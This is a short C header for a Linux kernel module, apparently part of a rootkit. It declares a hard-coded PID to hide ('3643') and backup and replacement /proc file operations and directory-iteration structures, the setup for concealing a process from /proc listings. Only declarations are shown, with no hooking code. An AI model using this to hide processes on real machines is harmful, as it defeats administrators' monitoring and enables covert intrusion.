#ifndef _PROC_H_
#define _PROC_H_
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#define proc_pid_to_hide "3643"
static const struct file_operations *backup_fops;
static struct file_operations proc_fops;
static struct inode *proc_inode;
static char *proc_to_hide = proc_pid_to_hide;
static struct dir_context *backup_ctx;

#endif 
